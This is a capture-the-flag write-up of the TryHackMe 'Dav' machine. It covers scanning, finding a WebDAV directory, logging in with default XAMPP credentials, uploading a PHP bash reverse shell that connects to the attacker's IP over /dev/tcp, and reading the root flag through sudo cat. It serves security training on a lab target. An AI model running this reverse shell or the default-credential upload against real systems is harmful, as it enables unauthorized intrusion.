# Dav

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: boot2root machine for FIT and bsides guatemala CTF
```

Room link: [https://tryhackme.com/r/room/bsidesgtdav](https://tryhackme.com/r/room/bsidesgtdav)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ nmap -v -sV -sC 10.10.13.109                                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 13:29 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Initiating Ping Scan at 13:29
Scanning 10.10.13.109 [2 ports]
Completed Ping Scan at 13:29, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:29
Completed Parallel DNS resolution of 1 host. at 13:29, 0.00s elapsed
Initiating Connect Scan at 13:29
Scanning 10.10.13.109 [1000 ports]
Discovered open port 80/tcp on 10.10.13.109
Completed Connect Scan at 13:29, 0.61s elapsed (1000 total ports)
Initiating Service scan at 13:29
Scanning 1 service on 10.10.13.109
Completed Service scan at 13:29, 6.11s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.13.109.
Initiating NSE at 13:29
Completed NSE at 13:29, 0.93s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.17s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Nmap scan report for 10.10.13.109
Host is up (0.039s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works

NSE: Script Post-scanning.
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Initiating NSE at 13:29
Completed NSE at 13:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

We have one service running:

- Apache httpd 2.4.18 on port 80

Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.  

### Check for files/directories with feroxbuster

Next, we check for files/directories on the web service with `feroxbuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -C 404 -x html,php,txt -u http://10.10.13.109 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.13.109
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://10.10.13.109/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.10.13.109/index.html
200      GET      375l      968w    11321c http://10.10.13.109/
401      GET       14l       54w      459c http://10.10.13.109/webdav
[####################] - 5m    350620/350620  0s      found:4       errors:0      
[####################] - 5m    350600/350600  1191/s  http://10.10.13.109/    
```

We have a `/webdav` directory which also matches the room name of `Dav`.  
The [HTTP status code](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes) of `401` means we need credentials to access it.  
[Some Googling](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) gives the default password of XAMPP/WebDav as `wampp:xampp`.

### Check out the /webdav directory

Manually browsing to `http://10.10.13.109/webdav/` shows a directory listing with the file `passwd.dav`.

![Directory listing on Dav machine](Images/Directory_listing_on_Dav_machine.png)

The file contains

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ curl -u wampp:xampp http://10.10.13.109/webdav/passwd.dav
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

The salt is `apr1` (April 1st) so this is probably a [red herring](https://en.wikipedia.org/wiki/Red_herring).

### Upload a reverse shell

Let's see if we can upload a reverse shell to the `/webdav` directory

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ davtest -auth wampp:xampp -url http://10.10.13.109/webdav/ 
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.13.109/webdav
********************************************************
NOTE    Random string for this session: Kabylv8Ia_ao6N
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N
********************************************************
 Sending test files
PUT     cfm     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.cfm
PUT     aspx    SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.aspx
PUT     jhtml   SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.jhtml
PUT     asp     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.asp
PUT     php     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.php
PUT     txt     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.txt
PUT     cgi     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.cgi
PUT     jsp     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.jsp
PUT     shtml   SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.shtml
PUT     html    SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.html
PUT     pl      SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.pl
********************************************************
 Checking for test file execution
EXEC    cfm     FAIL
EXEC    aspx    FAIL
EXEC    jhtml   FAIL
EXEC    asp     FAIL
EXEC    php     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.php
EXEC    txt     SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.txt
EXEC    cgi     FAIL
EXEC    jsp     FAIL
EXEC    shtml   FAIL
EXEC    html    SUCCEED:        http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.html
EXEC    pl      FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.cfm
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.aspx
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.jhtml
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.asp
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.php
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.txt
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.cgi
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.jsp
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.shtml
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.html
PUT File: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.pl
Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.php
Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.txt
Executes: http://10.10.13.109/webdav/DavTestDir_Kabylv8Ia_ao6N/davtest_Kabylv8Ia_ao6N.html
```

It seems we can upload `php` files.

We make a simple bash reverse shell in php

```php
<?php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.61.233/12345 0>&1'");
?>
```

Then we upload it with `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ curl -u wampp:xampp -T revshell.php http://10.10.13.109/webdav/ 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/revshell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.13.109 Port 80</address>
</body></html>
```

### Get a reverse shell

Next, we start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ nc -lvnp 12345                  
listening on [any] 12345 ...
```

And trigger the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ curl -u wampp:xampp http://10.10.13.109/webdav/revshell.php
```

When the connection comes through we do some basic tests

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Dav]
└─$ nc -lvnp 12345                  
listening on [any] 12345 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.13.109] 54444
bash: cannot set terminal process group (693): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/webdav$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/webdav$ ls -la  
ls -la
total 20
drwxr-xr-x 3 www-data root     4096 Sep 18 05:34 .
drwxr-xr-x 3 root     root     4096 Aug 25  2019 ..
drwxr-xr-x 2 www-data www-data 4096 Sep 18 05:26 DavTestDir_Kabylv8Ia_ao6N
-rw-r----- 1 www-data www-data   44 Aug 25  2019 passwd.dav
-rw-r--r-- 1 www-data www-data   81 Sep 18 05:34 revshell.php
```

### Get the user flag

Next, we can search for the user flag with `find`

```bash
www-data@ubuntu:/var/www/html/webdav$ find /home -type f -name [Uu]ser* 2>/dev/null
<ml/webdav$ find /home -type f -name [Uu]ser* 2>/dev/null                    
/home/merlin/user.txt
```

Let's cat it

```bash
www-data@ubuntu:/var/www/html/webdav$ cat /home/merlin/user.txt
cat /home/merlin/user.txt
4<REDACTED>a
```

### Enumeration

We now start enumerating for ways to escalate our privileges.  
First we check if we can run any commands as root via `sudo`

```bash
www-data@ubuntu:/var/www/html/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

We can execute `/bin/cat`.

### Get the root flag

Finally, we just cat the root flag

```bash
www-data@ubuntu:/var/www/html/webdav$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
1<REDACTED>5
```

That was way to easy!

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [davtest - Github](https://github.com/cldrn/davtest)
- [davtest - Kali Tools](https://www.kali.org/tools/davtest/)
- [feroxbuster - Github](https://github.com/epi052/feroxbuster)
- [feroxbuster - Kali Tools](https://www.kali.org/tools/feroxbuster/)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [List of HTTP status codes - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [Red herring - Wikipedia](https://en.wikipedia.org/wiki/Red_herring)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [WebDAV - Wikipedia](https://en.wikipedia.org/wiki/WebDAV)
